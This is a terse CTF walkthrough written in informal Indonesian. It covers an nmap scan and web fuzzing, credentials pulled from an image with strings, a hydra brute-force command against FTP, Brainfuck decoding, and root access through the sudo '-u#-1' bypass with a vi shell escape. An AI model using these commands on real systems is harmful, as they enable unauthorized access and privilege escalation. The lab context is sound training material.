# boot:
1. scan nmap 21 22 80 kebuka fuzz ada asset cek style css ada /secret
2. ke secret matiin js di about:config javascript.enable nya off aja
3. buka nanri ada kayak /WExYY2Cv-qU/ download coba 
4. strings aja fotonya -> nanti ada creds ftp
5. hydra aja -> hydra -l uname -P wordlist ip ftp
6. login ftp get file kalau ada
7. decode aja -> brainfc decoder cari aja
8. ssh ada msg -> cari aja di find / -name msg_nya 2>/dev/null
9. ada dir muncul -> ls -la aja ada creds passwd ternyata itu jir kukira decode dulu
10. klaim user flag

# PE :  
1. https://www.exploit-db.com/exploits/47502
2. sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt -> :!/bin/bash -> klaim root
